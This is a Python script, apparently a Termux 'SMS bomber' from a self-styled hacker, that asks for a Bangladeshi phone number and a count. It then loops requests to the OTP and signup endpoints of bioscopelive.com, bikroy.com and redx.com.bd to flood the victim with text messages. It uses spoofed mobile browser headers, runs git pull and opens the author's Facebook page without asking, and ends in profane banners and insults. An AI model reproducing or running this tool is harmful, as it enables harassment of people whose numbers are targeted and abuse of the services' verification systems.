import os
print("\033[1;92m 𝐩𝐫𝐨𝐜𝐜𝐞𝐬 💥⨠💥⨠💥⨠💥⨠💥⨠💥⨠💥⨠💥⨠💥 🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗠𝗢𝗡𝄟⃝  CYBER (ROBOT) SYSTEM INSTALL... \033[1;30m")
os.system("pkg install espeak")
print("\033[1;92m   𝐩𝐫𝐨𝐜𝐜𝐞𝐬 💥⨠💥⨠💥⨠💥⨠💥⨠💥⨠💥⨠💥⨠💥 🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗠𝗢𝗡𝄟⃝  ROBOT INSTALL COMPLETE \033[1;30m")
os.system('espeak -a 30 "Welcome to LMNX9 Tool "')
print("\033[1;92m   𝐩𝐫𝐨𝐜𝐜𝐞𝐬 💥⨠💥⨠💥⨠💥⨠💥⨠💥⨠💥⨠💥⨠💥 UPDATE CHECKING BOSS 🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗠𝗢𝗡𝄟⃝  CYBER KING\033[1;30m")
os.system('espeak -a 30 "WAITING FOR UPDATE "')
os.system("git pull")
import os,requests,time
time.sleep(1)
os.system("clear")
os.system("xdg-open https://www.facebook.com/LJ.LMNx9?mibextid=ZbWKwL")
logo3=("""


\x1b[38;5;196m       ██▓     ███▄ ▄███▓ ███▄    █ 
\x1b[38;5;196m      ▓██▒    ▓██▒▀█▀ ██▒ ██ ▀█   █ 
\x1b[38;5;196m      ▒██░    ▓██    ▓██░▓██  ▀█ ██▒
\x1b[38;5;196m      ▒██░    ▒██    ▒██ ▓██▒  ▐▌██▒
\x1b[38;5;196m      ░██████▒▒██▒   ░██▒▒██░   ▓██░
\x1b[38;5;196m      ░ ▒░▓  ░░ ▒░   ░  ░░ ▒░   ▒ ▒ 
\x1b[38;5;196m      ░ ░ ▒  ░░  ░      ░░ ░░   ░ ▒░
 \x1b[38;5;196m       ░ ░   ░      ░      ░   ░ ░ 
\x1b[38;5;196m          ░  ░       ░            ░ 
                              
\x1b[38;5;196m◄═════════════► \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m◄═══════════════►
\x1b[38;5;196m💥\033[38;5;46m[♥]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑   \x1b[38;5;196m \033[38;5;46m 🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m[💥]\033[38;5;46m𝐉𝐎𝐇𝐍𝐘           \x1b[38;5;196m
\x1b[38;5;196m💥\033[38;5;46m[𝐋]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  \x1b[38;5;196m \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m[💥]\033[38;5;46m𝐋𝐣.𝐋𝐌𝐍𝐱𝟗   \x1b[38;5;196m
\x1b[38;5;196m💥\033[38;5;46m[𝐈]\033[38;5;46m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \x1b[38;5;196m \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m[💥]\033[38;5;46m𝐥𝐦𝐧𝐱𝟗𝐣𝐨𝐡𝐧𝐲     \x1b[38;5;196m
\x1b[38;5;196m💥\033[38;5;46m[𝐌]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁    \x1b[38;5;196m \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m[💥]\033[38;5;46m𝐋𝐌𝐍𝐱𝟗-𝐉𝐎𝐇𝐍𝐘 \x1b[38;5;196m
\x1b[38;5;196m💥\033[38;5;46m[𝐎]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌  \x1b[38;5;196m \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m[💥]\033[38;5;46m@𝐋𝐌𝐍𝐱𝟗    \x1b[38;5;196m
\x1b[38;5;196m💥\033[38;5;46m[𝐍]\033[38;5;46m𝐈𝐌𝐎       \x1b[38;5;196m \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m[💥]\033[38;5;46m𝐅𝐮𝐜𝐤 𝐘𝐨𝐮     \x1b[38;5;196m
\x1b[38;5;196m💥\033[38;5;46m[♥]\033[38;5;46m𝐅𝐑𝐎𝐌     \x1b[38;5;196m \033[38;5;46m 🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗠𝗢𝗡𝄟⃝ \x1b[38;5;196m [💥]\033[38;5;46m𝐒𝐀𝐕𝐀𝐑  𝐃𝐡𝐚𝐤𝐚    \x1b[38;5;196m 
\x1b[38;5;196m◄═════════════► \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m◄═══════════════►\033[00m\033[1;30m""")
os.system('espeak -a 3 "author Johny "')
os.system('espeak -a 3 "Facebook  Lj.lmnx9 "')
os.system('espeak -a 3 "whathapp lmnx9johny"')
os.system('espeak -a 3 "github LMNx9-JOHNY  "')
os.system('espeak -a 3 "telegram @Limon Hossain "')
os.system('espeak -a 3 "imo Just Fuck You Baby "')
os.system('espeak -a 3 "from savar dhaka "')
print(logo3)
num=input("""  \033[38;5;46m𝐓𝐚𝐫𝐠𝐞𝐭 𝐍𝐮𝐦𝐛𝐞𝐫 : +880""")
amount=int(input("\n  \033[38;5;46m𝐓𝐚𝐫𝐠𝐞𝐭 𝐀𝐦𝐨𝐮𝐧𝐭  : "))
headers1={
			  "authority":"www.bioscopelive.com",
			  "method":"GET",
			  "scheme":"https",
			  "accept":"*/*",
			  "accept-encoding":"gzip, deflate, br",
			  "accept-language":"en-US,en;q=0.9,bn-aD;q=0.8,bn;q=0.7",
			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
			  "save-data":"on",
			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
			  "sec-ch-ua-mobile":"?1",
			  "sec-ch-ua-platform":'Android',
			  "sec-fetch-dest":"empty",
			  "sec-fetch-mode":"cors",
			  "sec-fetch-site":"same-origin",
			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
			  "x-requested-with":"XMLHttpRequest"
}
url1="https://www.bioscopelive.com/en/login/send-otp?phone=880"+num+"&operator=bd-otp"
headers2={
         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
url2="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+num
data={
  "name": num,
  "phoneNumber": num,
  "service": "redx"
}
headers3={
  "referer":"https://redx.com.bd/",
  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
ses=0
while amount>ses:
  sent1=requests.get(url1,headers=headers1)
  if sent1.status_code==200:
    ses+=1
    print(f"\n{ses}  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗠𝗢𝗡𝄟⃝  -𝐒𝐌𝐒 𝐒𝐞𝐧𝐭 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 💥")
  else:
    pass
  
  sent2=requests.get(url2,headers=headers2)
  if sent2.status_code==200:
    ses+=1
    print(f"\n{ses} \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗠𝗢𝗡𝄟⃝  -𝐒𝐌𝐒 𝐒𝐞𝐧𝐭 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 💥")
  else:
    pass
  
  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
  if send3.status_code==200:
    ses+=1
    print(f"\n{ses} \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗠𝗢𝗡𝄟⃝  -𝐒𝐌𝐒 𝐒𝐞𝐧𝐭 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 💥")
    
  else:
    pass
os.system("clear")
print(""" \033[1;32m
\x1b[38;5;196m 𝐋𝐌𝐍𝐱𝟗 😈        

\x1b[38;5;196m ___________  ___  ___  ___ 
\x1b[38;5;196m/  ___| ___ \/ _ \ |  \/  | 
\x1b[38;5;196m\ `--.| |_/ / /_\ \| .  . | 
\x1b[38;5;196m `--. \  __/|  _  || |\/| | 
\x1b[38;5;196m/\__/ / |   | | | || |  | | 
\x1b[38;5;196m\____/\_|   \_| |_/\_|  |_/ 
    
\x1b[38;5;196m◄═════════════► \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m◄═══════════════►
\x1b[38;5;196m💥\033[38;5;46m[♥]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑   \x1b[38;5;196m \033[38;5;46m 🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m[💥]\033[38;5;46m𝐉𝐎𝐇𝐍𝐘           \x1b[38;5;196m
\x1b[38;5;196m💥\033[38;5;46m[𝐋]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  \x1b[38;5;196m \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m[💥]\033[38;5;46m𝐋𝐣.𝐋𝐌𝐍𝐱𝟗   \x1b[38;5;196m
\x1b[38;5;196m💥\033[38;5;46m[𝐈]\033[38;5;46m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \x1b[38;5;196m \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m[💥]\033[38;5;46m𝐥𝐦𝐧𝐱𝟗𝐣𝐨𝐡𝐧𝐲     \x1b[38;5;196m
\x1b[38;5;196m💥\033[38;5;46m[𝐌]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁    \x1b[38;5;196m \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m[💥]\033[38;5;46m𝐋𝐌𝐍𝐱𝟗-𝐉𝐎𝐇𝐍𝐘 \x1b[38;5;196m
\x1b[38;5;196m💥\033[38;5;46m[𝐎]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌  \x1b[38;5;196m \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m[💥]\033[38;5;46m@𝐋𝐌𝐍𝐱𝟗    \x1b[38;5;196m
\x1b[38;5;196m💥\033[38;5;46m[𝐍]\033[38;5;46m𝐈𝐌𝐎       \x1b[38;5;196m \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m[💥]\033[38;5;46m𝐅𝐮𝐜𝐤 𝐘𝐨𝐮     \x1b[38;5;196m
\x1b[38;5;196m💥\033[38;5;46m[♥]\033[38;5;46m𝐅𝐑𝐎𝐌     \x1b[38;5;196m \033[38;5;46m 🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗠𝗢𝗡𝄟⃝ \x1b[38;5;196m [💥]\033[38;5;46m𝐒𝐀𝐕𝐀𝐑  𝐃𝐡𝐚𝐤𝐚    \x1b[38;5;196m 
\x1b[38;5;196m◄═════════════► \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m◄═══════════════►\033[00m\033[1;30m
      \033[38;5;46m____  ____  _  ________
     \033[38;5;46m/ __ \/ __ \/ | / / ____/
    \033[38;5;46m/ / / / / / /  |/ / __/   
   \033[38;5;46m/ /_/ / /_/ / /|  / /___   
  \033[38;5;46m/_____/\____/_/ |_/_____/   
                            
 𝐓𝐡𝐚𝐧𝐤𝐬 𝐅𝐨𝐫 𝐔𝐬𝐢𝐧𝐠 𝐌𝐲 𝐓𝐨𝐨𝐥 💔
 𝐅𝐨𝐫 𝐌𝐨𝐫𝐞 𝐓𝐨𝐨𝐥𝐬 💔
 𝐅𝐨𝐥𝐥𝐨𝐰 𝐌𝐞 𝐎𝐧 𝐆𝐢𝐭𝐇𝐮𝐛 💔
 𝐆𝐢𝐭𝐇𝐮𝐛 : 𝐋𝐌𝐍𝐱𝟗-𝐉𝐎𝐇𝐍𝐘 
""")
#madarcod ase geli script curi korte 🙂
#bancod tk khoroc kore nijeo to sikhte paros
